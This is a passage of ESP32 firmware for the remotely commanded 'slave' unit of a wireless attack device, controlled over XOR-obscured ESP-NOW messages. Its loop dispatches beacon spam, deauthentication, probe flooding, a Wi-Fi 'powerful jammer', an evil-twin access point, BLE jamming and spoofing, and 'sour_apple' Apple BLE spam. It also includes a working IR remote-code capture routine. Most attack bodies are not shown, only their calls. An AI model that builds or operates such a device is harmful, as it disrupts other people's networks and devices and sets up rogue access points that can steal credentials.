  sendLogToMaster("[Sub-GHz Scanner] Scan finished.");
}

void startIRScan() {
  sendLogToMaster("[IR Scanner] Point remote at receiver and press a button...");
  pinMode(IR_RX_PIN, INPUT);
  
  unsigned long startTime = millis();
  bool captured = false;
  
  while (millis() - startTime < 6000) { // Scan for 6 seconds
    if (digitalRead(IR_RX_PIN) == LOW) { // IR receiver output active-low
      unsigned long lowPulse = pulseIn(IR_RX_PIN, LOW, 15000);
      unsigned long highPulse = pulseIn(IR_RX_PIN, HIGH, 15000);
      
      if (lowPulse > 8000 && lowPulse < 10000 && highPulse > 4000 && highPulse < 5000) {
        // Decode NEC 32 bits
        uint32_t code = 0;
        bool ok = true;
        
        for (int i = 0; i < 32; i++) {
          unsigned long bitLow = pulseIn(IR_RX_PIN, LOW, 2000);
          unsigned long bitHigh = pulseIn(IR_RX_PIN, HIGH, 2000);
          
          if (bitLow == 0 || bitHigh == 0) {
            ok = false;
            break;
          }
          
          code <<= 1;
          if (bitHigh > 1000) {
            code |= 1;
          }
        }
        
        if (ok) {
          char buf[64];
          snprintf(buf, sizeof(buf), "[IR Scanner] Captured NEC Code: 0x%08X", code);
          sendLogToMaster(buf);
          captured = true;
          break;
        }
      }
      
      delay(100);
      sendLogToMaster("[IR Scanner] Captured RAW IR transmission!");
      captured = true;
      break;
    }
    delay(5);
  }
  
  if (!captured) {
    sendLogToMaster("[IR Scanner] Scan timeout. No signal detected.");
  }
}

void startSubGhzReplay() { sendLogToMaster("[Error] Sub-GHz Replay requires CC1101"); }
void startSubGhzJammer() { sendLogToMaster("[Error] Sub-GHz Jammer requires CC1101"); }
void startIRReplay() { sendLogToMaster("[Error] IR Replay requires IR-led"); }

// ===== RESTORE WIFI =====
void restoreWiFiState() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  WiFi.setSleep(false);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);
}

// ===== STOP ATTACKS =====
void stopAttack() {
  attackRunning = false;
  currentAttack = "";
  bleJammerInitialized = false;
  sourAppleInitialized = false;
  evilTwinStarted = false;
  lastStationCount = 0;

  WiFi.softAPdisconnect(true);
  if (BLEDevice::getAdvertising()) {
    BLEDevice::getAdvertising()->stop();
  }
  esp_wifi_set_promiscuous(false);
  restoreWiFiState();
  digitalWrite(LED_PIN, LOW);
  
  // Send direct confirmation to Master
  if (hasMasterMac) {
    struct_message response;
    strcpy(response.command, "stopped");
    strcpy(response.attack, "");
    strcpy(response.logMsg, "All attacks stopped. Standby mode.");
    
    XOR_crypt((uint8_t*)&response, sizeof(response)); // Encrypt
    
    for (int retry = 0; retry < 3; retry++) {
      esp_err_t result = esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response));
      if (result == ESP_OK) {
        break;
      }
      Serial.printf("[ESP-NOW] Failed to send stopped confirmation (attempt %d/3), err: %d\n", retry + 1, result);
      delay(5);
    }
  }
  
  Serial.println("All attacks stopped");
}

// ===== SEND PONG TO MASTER WITH CURRENT TEMP =====
void sendPong(const uint8_t *masterMac) {
  esp_now_peer_info_t peer;
  memset(&peer, 0, sizeof(peer));
  memcpy(peer.peer_addr, masterMac, 6);
  peer.channel = 1;
  peer.encrypt = false;
  
  if (!esp_now_is_peer_exist(masterMac)) {
    if (esp_now_add_peer(&peer) != ESP_OK) {
      Serial.println("Failed to add peer");
    }
  }
  
  struct_message response;
  strcpy(response.command, "pong");
  strcpy(response.attack, "");
  
  // Read Slave Board temperature
  float sTemp = getBoardTemp();
  snprintf(response.logMsg, sizeof(response.logMsg), "%.1f", sTemp);
  
  XOR_crypt((uint8_t*)&response, sizeof(response)); // Encrypt
  
  for (int retry = 0; retry < 3; retry++) {
    esp_err_t result = esp_now_send(masterMac, (uint8_t *)&response, sizeof(response));
    if (result == ESP_OK) {
      break;
    }
    Serial.printf("[ESP-NOW] Failed to send pong to Master (attempt %d/3), err: %d\n", retry + 1, result);
    delay(5);
  }
}

void registerMasterPeer(const uint8_t *mac) {
  esp_now_peer_info_t peer;
  memset(&peer, 0, sizeof(peer));
  memcpy(peer.peer_addr, mac, 6);
  peer.channel = 1;
  peer.encrypt = false;
  
  if (esp_now_is_peer_exist(mac)) {
    esp_now_del_peer(mac);
  }
  if (esp_now_add_peer(&peer) != ESP_OK) {
    Serial.println("Failed to add peer");
  }
}

// ===== ESP-NOW HANDLER =====
#if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
void OnDataRecv(const esp_now_recv_info_t *info, const uint8_t *incomingData, int len) {
  const uint8_t *srcMac = info->src_addr;
#else
void OnDataRecv(const uint8_t *mac_addr, const uint8_t *incomingData, int len) {
  const uint8_t *srcMac = mac_addr;
#endif
  if (len != sizeof(myData)) {
    Serial.printf("Invalid packet len: %d\n", len);
    return;
  }
  memcpy(&myData, incomingData, sizeof(myData));
  XOR_crypt((uint8_t*)&myData, sizeof(myData)); // Decrypt
  myData.command[15] = '\0';
  myData.attack[31] = '\0';

  // Store Master MAC
  if (!hasMasterMac || memcmp(masterMacAddress, srcMac, 6) != 0) {
    memcpy(masterMacAddress, srcMac, 6);
    hasMasterMac = true;
    Serial.printf("Master MAC registered: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  srcMac[0], srcMac[1], srcMac[2], srcMac[3], srcMac[4], srcMac[5]);
    
    registerMasterPeer(srcMac); // Add Master as peer
    
    // Save to Preferences
    Preferences prefs;
    prefs.begin("esptool2", false);
    prefs.putBytes("masterMac", masterMacAddress, 6);
    prefs.putBool("hasMasterMac", true);
    prefs.end();
  }

  lastMasterHeardTime = millis();

  if (strcmp(myData.command, "ping") == 0) {
    Serial.println("Received PING, sending PONG...");
    sendPong(srcMac);
    return;
  }

  Serial.print("Received: command ");
  Serial.print(myData.command);
  Serial.print(" | target ");
  Serial.println(myData.attack);

  if (strcmp(myData.command, "start") == 0) {
    if (attackRunning) {
      sendLogToMaster("[Warning] Attack already active");
      Serial.println("Attack already active");
      return;
    }
    attackRunning = true;
    currentAttack = String(myData.attack);
    
    char buf[64];
    snprintf(buf, sizeof(buf), "Starting task: %s", myData.attack);
    sendLogToMaster(buf);
  } else if (strcmp(myData.command, "stop") == 0) {
    stopAttack();
  } else {
    Serial.println("Unknown command");
  }
}

// ===== SETUP =====
void setup() {
  Serial.begin(115200);
  esp_task_wdt_init(15, true);
  esp_task_wdt_add(NULL);
  
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  WiFi.setSleep(false);

  // Channel 1 for stable ESP-NOW
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);

  // Initialize BLE stack once
  BLEDevice::init("ESP32-S3");

  // SCK=12, MISO=13, MOSI=11, CS=10
  SPI.begin(12, 13, 11, 10);

  // Check CC1101 connection
  if (checkCC1101()) {
    Serial.println("CC1101 found!");
  } else {
    Serial.println("CC1101 not found.");
  }

  if (esp_now_init() != ESP_OK) {
    Serial.println("ESP-NOW init error");
    return;
  }
  esp_now_register_recv_cb(OnDataRecv);
  
  // Load paired Master MAC from Preferences
  Preferences prefs;
  prefs.begin("esptool2", false);
  if (prefs.getBool("hasMasterMac", false)) {
    prefs.getBytes("masterMac", masterMacAddress, 6);
    hasMasterMac = true;
    Serial.printf("Loaded Master MAC from Flash: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  masterMacAddress[0], masterMacAddress[1], masterMacAddress[2], 
                  masterMacAddress[3], masterMacAddress[4], masterMacAddress[5]);
    
    registerMasterPeer(masterMacAddress); // Register Master as peer
  }
  prefs.end();

  lastMasterHeardTime = millis();
  Serial.println("SLAVE ready for commands");
  Serial.print("My MAC: ");
  Serial.println(WiFi.macAddress());
}

// ===== LOOP =====
void loop() {
  esp_task_wdt_reset();
  updateLedIndicator();
  
  // Safety timeout: stop attack if Master connection is lost for >15 seconds
  if (attackRunning && hasMasterMac && (millis() - lastMasterHeardTime > 15000)) {
    Serial.println("Master connection timeout. Stopping attack.");
    stopAttack();
  }
  
  if (attackRunning && currentAttack != "") {
    // Periodically return to Channel 1 to listen for Master command (stop/ping)
    // Prevents "deaf transceiver" issue during active channel-hopping/jamming attacks
    if (millis() - lastListenTime >= 1000) {
      esp_wifi_set_promiscuous(false);
      esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
      
      // Wait for 500ms on Channel 1 to receive incoming ESP-NOW command
      unsigned long startListen = millis();
      while (millis() - startListen < 500) {
        delay(1); 
        yield();
      }
      
      lastListenTime = millis();
      if (!attackRunning) return; // Exit if stopped during listening window
    }
    
    bool boost = currentAttack.endsWith("_boost");
    String baseAttackName = boost ? currentAttack.substring(0, currentAttack.length() - 6) : currentAttack;
    
    if (baseAttackName == "beacon") {
      runBeaconSpamStep(boost);
    }
    else if (baseAttackName == "deauth") {
      runDeauthStep(boost);
    }
    else if (baseAttackName == "probe") {
      runProbeFloodStep();
    }
    else if (baseAttackName == "powerful_jammer") {
      runPowerfulJammerStep();
    }
    else if (baseAttackName == "wifi_scan") {
      startWiFiScan();
      attackRunning = false;
      currentAttack = "";
      restoreWiFiState();
    }
    else if (baseAttackName == "evil_twin") {
      if (!evilTwinStarted) {
        startEvilTwin();
        evilTwinStarted = true;
        lastStationCount = -1;
      }
      runEvilTwinStep();
    }
    else if (baseAttackName == "ble_scan") {
      startBLEScan();
      attackRunning = false;
      currentAttack = "";
    }
    else if (baseAttackName == "ble_spoofer") {
      startBLESpoofer();
    }
    else if (baseAttackName == "ble_jammer") {
      runBLEJammerStep();
    }
    else if (baseAttackName == "sour_apple") {
      runSourAppleStep(boost);
    }
    else if (baseAttackName == "ghz_scan") { startGhzScan(); attackRunning = false; currentAttack = ""; }
    else if (baseAttackName == "protokill") { startProtokill(); attackRunning = false; currentAttack = ""; }
    else if (baseAttackName == "subghz_scan") { startSubGhzScan(); attackRunning = false; currentAttack = ""; }
    else if (baseAttackName == "subghz_replay") { startSubGhzReplay(); attackRunning = false; currentAttack = ""; }
    else if (baseAttackName == "subghz_jammer") { startSubGhzJammer(); attackRunning = false; currentAttack = ""; }
    else if (baseAttackName == "ir_scan") { startIRScan(); attackRunning = false; currentAttack = ""; }
    else if (baseAttackName == "ir_replay") { startIRReplay(); attackRunning = false; currentAttack = ""; }
  }
  delay(1);
}
